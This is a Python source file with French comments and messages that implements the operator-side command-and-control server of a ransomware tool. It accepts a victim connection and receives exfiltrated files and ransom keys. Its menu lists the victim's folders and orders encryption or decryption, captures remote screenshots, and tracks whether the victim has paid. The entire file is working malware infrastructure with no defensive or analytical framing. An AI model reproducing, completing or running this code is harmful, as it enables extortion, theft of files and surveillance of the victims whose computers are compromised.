import socket
import os
import select
from datetime import datetime

HOST = "0.0.0.0"
PORT = 5001
CAPTURE_DIR = "captures"
EXFIL_DIR = "donnees_windows"
KEY_FILE = "ransom_key_received.key"

def load_key():
    with open(KEY_FILE, "rb") as f:
        return f.read()

def save_key(data):
    with open(KEY_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Clé reçue et enregistrée dans {KEY_FILE}")

def list_captures():
    files = os.listdir(CAPTURE_DIR) if os.path.exists(CAPTURE_DIR) else []
    if files:
        print("[+] Captures :")
        for f in files:
            print(" -", f)
    else:
        print("[!] Aucune capture.")

def start_server():
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    os.makedirs(EXFIL_DIR, exist_ok=True)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[+] Serveur en écoute sur {HOST}:{PORT}")
        conn, addr = server.accept()
        print(f"[+] Connexion avec {addr}")

        while True:
            ready, _, _ = select.select([conn], [], [], 0.5)
            if ready:
                header = conn.recv(128)
                decoded = header.decode(errors="ignore")

                if decoded.startswith("payment_status") or decoded.startswith("victime_paye"):
                    continue
                elif header.startswith(b"exfil:"):
                    parts = decoded.split(":")
                    if len(parts) >= 3:
                        filename = parts[1]
                        filesize = int(parts[2])
                        save_path = os.path.join(EXFIL_DIR, filename)
                        with open(save_path, "wb") as f:
                            received = 0
                            while received < filesize:
                                chunk = conn.recv(min(4096, filesize - received))
                                if not chunk:
                                    break
                                f.write(chunk)
                                received += len(chunk)
                        print(f"[+] Fichier exfiltré : {save_path}")
                    continue

            print("\n[ Menu ]")
            print("1 - Lister les dossiers et chiffrer un dossier")
            print("2 - Lister et déchiffrer un dossier")
            print("3 - Capture d’écran")
            print("4 - Afficher les captures")
            print("5 - Quitter")

            choice = input("Choix : ")

            if choice == "1":
                conn.sendall(b"listdirs")
                print("[+] Listing des dossiers...")
                data = conn.recv(8192).decode()
                print(data)
                selected = input("Dossier à chiffrer : ").strip()
                conn.sendall(f"encrypt:{selected}".encode())

            elif choice == "2":
                conn.sendall(b"key_request")
                print("[+] Requête de clé...")
                while True:
                    response = conn.recv(8192)
                    if not response.startswith(b"key:"):
                        break
                    save_key(response[4:])

                print(response.decode())
                selected = input("Dossier à déchiffrer : ").strip()
                conn.sendall(f"decrypt:{selected}".encode())

            elif choice == "3":
                conn.sendall(b"screenshot")
                size_data = conn.recv(16)
                if size_data.startswith(b"key:"):
                    save_key(size_data[4:] + conn.recv(4096))
                    continue
                total_size = int(size_data.decode().strip())
                received_data = b""
                while len(received_data) < total_size:
                    received_data += conn.recv(4096)
                filename = f"{CAPTURE_DIR}/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(filename, "wb") as f:
                    f.write(received_data)
                print(f"[+] Capture sauvegardée : {filename}")

            elif choice == "4":
                list_captures()

            elif choice == "5":
                conn.sendall(b"exit")
                break

if __name__ == "__main__":
    start_server()
